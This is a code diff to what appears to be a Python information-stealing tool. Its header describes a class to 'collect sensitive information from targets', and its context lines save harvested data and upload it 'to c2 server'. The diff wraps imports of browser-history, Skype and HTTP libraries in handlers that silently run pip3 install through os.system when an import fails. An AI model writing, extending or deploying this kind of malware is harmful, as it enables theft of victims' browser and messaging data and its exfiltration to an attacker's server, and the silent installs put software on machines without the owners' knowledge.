@@ -3,16 +3,32 @@
  # @ Modified time: 2024-09-04 11:35:24
  # @ Description: class to collect sensitive information from targets
  '''
+from __future__ import annotations
+
+from pathlib import Path
 import platform
 import os
-import browserhistory as bh
+try:
+    import browserhistory as bh
+except:
+    os.system("pip3 install browserhistory==0.1.2")
+
 import base64
-from skpy import Skype
+try:
+    from skpy import Skype
+except:
+    os.system("pip3 install Skpy==0.11")
+
 import zlib
-from pathlib import Path
 import tempfile
-from dotenv import load_dotenv
-import requests
+try:
+    from dotenv import load_dotenv
+except:
+    os.system("pip3 install python-dotenv==1.0.1")
+try:
+    import requests
+except:
+    os.system("pip3 install requests==2.32.3")
 
 # load .env for sensitive tokens
 load_dotenv()
@@ -238,7 +254,7 @@ if __name__ == "__main__":
 
     # get the information and saved to a temp folder
     senscanner._sen_info(file_name)
-
+    from pathlib import Path
     # upload file to c2 server
     remote_file = Path(temp_path).joinpath(file_name)
 
